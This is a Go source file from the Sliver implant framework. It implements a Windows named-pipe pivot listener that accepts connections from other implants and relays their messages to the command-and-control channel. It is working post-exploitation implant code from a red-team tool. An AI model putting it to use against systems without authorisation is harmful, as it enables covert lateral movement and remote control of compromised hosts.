package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}
	"log"
	// {{end}}
	"net"
	"os"
	"strings"
	"time"
	"math/rand"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/transports"
	"github.com/bishopfox/sliver/sliver/3rdparty/winio"

	"github.com/golang/protobuf/proto"
)


func StartNamedPipeListener(pipeName string) error {
	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
	// {{if .Debug}}
	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
	// {{end}}
	if err != nil {
		return err	
	}
	go nampedPipeAcceptNewConnection(&ln)
	return nil
}

func nampedPipeAcceptNewConnection(ln *net.Listener) {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = "."
	}
	namedPipe := strings.ReplaceAll((*ln).Addr().String(), ".", hostname)
	for {
		conn, err := (*ln).Accept()
		if err != nil {
			continue
		}
		rand.Seed(time.Now().UnixNano())
		pivotID := rand.Uint32()
		pivotsMap.AddPivot(pivotID, &conn, "named-pipe", namedPipe)
		//SendPivotOpen(pivotID, "named-pipe", namedPipe)

		// {{if .Debug}}
		log.Println("Accepted a new connection")
		// {{end}}

		// handle connection like any other net.Conn
		go nampedPipeConnectionHandler(&conn, pivotID)
	}
}

func nampedPipeConnectionHandler(conn *net.Conn, pivotID uint32) {

	defer func() {
		// {{if .Debug}}
		log.Printf("Cleaning up for pivot %d\n", pivotID)
		// {{end}}
		(*conn).Close()
		pivotClose := &sliverpb.PivotClose{
			PivotID: pivotID,
		}
		data, err := proto.Marshal(pivotClose)
		if err != nil {
			// {{if .Debug}}
			log.Println(err)
			// {{end}}
			return
		}
		connection := transports.GetActiveConnection()
		if connection.IsOpen {
			connection.Send <- &sliverpb.Envelope{
				Type: sliverpb.MsgPivotClose,
				Data: data,
			}
		}
	}()

	for {
		envelope, err := PivotReadEnvelope(conn)
		if err != nil {
			// {{if .Debug}}
			log.Println(err)
			// {{end}}
			return
		}
		dataBuf, err1 := proto.Marshal(envelope)
		if err1 != nil {
			// {{if .Debug}}
			log.Println(err1)
			// {{end}}
			return
		}
		pivotOpen := &sliverpb.PivotData{
			PivotID: pivotID,
			Data:    dataBuf,
		}
		connection := transports.GetActiveConnection()
		if envelope.Type == 1 {
			SendPivotOpen(pivotID, dataBuf, connection)
			continue
		}
		data2, err2 := proto.Marshal(pivotOpen)
		if err2 != nil {
			// {{if .Debug}}
			log.Println(err2)
			// {{end}}
			return
		}
		if connection.IsOpen {
			connection.Send <- &sliverpb.Envelope{
				Type: sliverpb.MsgPivotData,
				Data: data2,
			}
		}
	}
}